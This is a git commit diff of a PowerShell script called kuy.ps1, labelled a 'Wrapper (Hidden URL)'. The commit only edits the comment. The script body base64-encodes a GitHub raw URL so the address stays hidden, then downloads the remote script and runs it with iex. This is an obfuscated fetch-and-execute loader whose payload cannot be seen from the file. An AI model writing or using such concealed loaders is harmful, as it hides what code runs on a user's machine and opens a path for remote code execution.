18934ddb169dc9f6272e2547e9ccfd96f2a3d8bb
getx796-Harem <getx796@gmail.com>
2026-05-14 00:11:43 +0700

    Update kuy.ps1

--- kuy.ps1
+++ kuy.ps1
@@ -1,4 +1,4 @@
-# kuy.ps1 - ตัวซ่อน URL ของสคริปต์หลัก
+# kuy.ps1 - Wrapper (Hidden URL)
 $u = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2dldHg3OTYtSGFyZW0vY21kRnJlZWZpcmUvbWFpbi9kdWdkdXkucHMx'))
 $s = (iwr -UseBasicParsing $u).Content
 iex $s
